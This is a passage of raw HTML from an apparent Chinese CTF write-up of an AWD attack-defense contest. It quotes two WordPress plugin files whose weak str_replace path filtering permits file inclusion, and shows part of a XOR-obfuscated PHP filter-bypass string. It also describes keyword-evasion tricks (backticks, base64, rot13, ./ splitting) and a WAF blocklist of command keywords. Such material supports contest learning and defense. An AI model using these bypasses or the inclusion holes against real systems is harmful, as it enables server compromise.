style=color:#f92672>^</span> <span style=color:#e6db74>&#34;&gt;&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;@&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;-&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;?&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;?&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;b&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;]&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;t&#34;</span>));
</span></span></code></pre></td></tr></table></div></div><p>后来发现两处文件包含。可以利用<code>./</code> 和<code>../</code> 分隔关键字绕过WAF，因为醒悟的比较晚和自动化做得不够方便，这个没有发挥太大作用。</p><p><code>wwwroot\wordpress\wp-content\plugins\localize-my-post\ajax\include.php</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//Include WP base to have the basic WP functions
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>include_once</span>($_SERVER[<span style=color:#e6db74>&#39;DOCUMENT_ROOT&#39;</span>] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;/wp-blog-header.php&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//Set status 200 header
</span></span></span><span style=display:flex><span><span style=color:#75715e>//Include requested file if it exists
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_REQUEST[<span style=color:#e6db74>&#39;file&#39;</span>])){
</span></span><span style=display:flex><span>	$file<span style=color:#f92672>=</span>$_REQUEST[<span style=color:#e6db74>&#39;file&#39;</span>];
</span></span><span style=display:flex><span>	$file <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;./&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,$file);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;HTTP/1.1 200 OK&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>include</span>($file);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>和 <code>wwwroot\wordpress\wp-content\plugins\site-editor\editor\extensions\pagebuilder\includes\ajax_shortcode_pattern.php</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>isset</span>( $_REQUEST[<span style=color:#e6db74>&#39;ajax_path&#39;</span>] ) ){
</span></span><span style=display:flex><span>	$ajax_path<span style=color:#f92672>=</span>$_REQUEST[<span style=color:#e6db74>&#39;ajax_path&#39;</span>];
</span></span><span style=display:flex><span>	$ajax_path <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;../&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,$ajax_path);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>require_once</span> $ajax_path;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></td></tr></table></div></div><p>此外，有些队伍过滤了system，exe等关键字，采用反引号，base64编码，rot13编码等尝试绕过。</p><p>也许因为check机制不好使，某个时间开始大约一半以上的队伍选择关站保平安，即使只是访问对方主页也会被WAF拦截。这不难实现，只要在WAF里面把IP当关键字过滤掉就可以。这大概不太厚道吧，但黑客嘛，也许就是理解并打击规则？</p><p>没挖出啥洞，我好菜啊。而且WAF这么强，挖出来也用不上吧。</p><p><strong>defense</strong></p><p>一开始就在WAF上把D盾扫出来的几个可疑文件加入黑名单，后来又配了敏感关键字<code>exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13</code> 等，所以Web基本只在刚开始的几轮失分。</p><p>全程就是每轮打一下，看看WAF有没拦到有趣的东西，挣扎着试图挖到洞，以及尝试一些绕过关键字的方法。</p><h2 id=pwn>PWN<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h2><p><strong>attack</strong></p><p>因为Web手比较菜:(，PWN手帮忙看了半天Web，开始搞PWN的时间比较晚，心态有点崩，最后思路来得晚，全程没打出分，很可惜。也许后面研究下王博的WP再复现一下。</p><p><strong>defense</strong></p><p>权限问题动不了PWN文件，patch无门，基本坐着挨打。同样可能因为check机制的问题，存在一个fork炸弹躺下装死的防御思路。</p><h1 id=挨打要立正>挨打要立正<a hidden class=anchor aria-hidden=true href=#挨打要立正>#</a></h1><p>拿到两个第二确实是赛前没想到的，但这改变不了我菜的本质。队友们虽然比我强，但是也依然有很大进步空间，包括更扎实的基础，更熟练的操作，更灵活的思路，更默契的配合等等。</p><p>第一天突围赛刚开始比较顺利，最后五分钟被夜影师傅所在队伍反超，放上他们的逆向writeup：<a href=https://blog.csdn.net/whklhhhh/article/details/84454534>181124 逆向-2018“柏鹭杯”厦大邀请赛初赛（Re1、2）</a> ，以弥补本文不足。</p><p>第二天AWD则全程被北航吊打，伏地膜。</p><p><del>因为看到某群里有人吐槽这是垃圾比赛，我觉得这个说法不太负责任，所以作为厦大学生多说两句。从题目来说。crypto一题有点脑洞，一题简单，一题中等，可以接受，misc也是相对合格的，Web题思路清晰，也有有趣的东西。reverse，PWN中也不乏质量不错的题，做出题的师傅也是认可其有自己特点的。</del></p><p><del>除了题目，比赛奖金也是很高的，闭幕式到场的嘉宾也是够级别的，比赛环境可以说相当不错，住宿交通也很人性化。从各个角度来说，这都可以算是一场有诚意的，有愿望办好且确实做得不错的比赛。所以不管是因为没被邀请、做不出题、确实感觉题目质量不行、现场厕所不够用、志愿者里面漂亮小姐姐不够多还是其他什么原因而觉得不爽的，吐槽时把话说清楚还是比较好的，免得引起不必要的误解。明年应该还会举办，欢迎路过的大佬来玩。</del></p><p><del>当然，要改进的东西还是蛮多的，反思不应该由我来做，简单说点自己的感受。最不理想的大概是AWD的check，这个称为健康检查的东西好像分不清怎样是健康。其次是使用WAF作为Web防守的工具固然可以让即使是像我这样的AWD经验不足的选手都可以很舒服，也减轻维护压力，但这样是没法打出刺激的AWD的，再加上check和我一样菜，除了没搞清楚状况的选手，有坚定原则的选手，很可能出现全场全线WAF，那就没啥好打的了。最后是PWN没有给选手patch的权限，这是不太正常的，直接导致最好的防护是把自己搞down，不管主办方是出于维护难度考虑还是什么，对真正有能力且想打一场有意思的比赛的选手来说游戏体验是不太好的。所以如果揪住这几点发表比较严厉的批评的话我是没话说的😔</del></p><p>最后，感谢队友带飞。</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/190223-tamuctf/><span class=title>« Prev</span><br><span>TAMUctf writeup</span></a>
<a class=next href=https://ret2neo.cn/post/181124-what-if-e-phi-not-coprime/><span class=title>Next »</span><br><span>如果RSA加密中的e和phi不互质</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>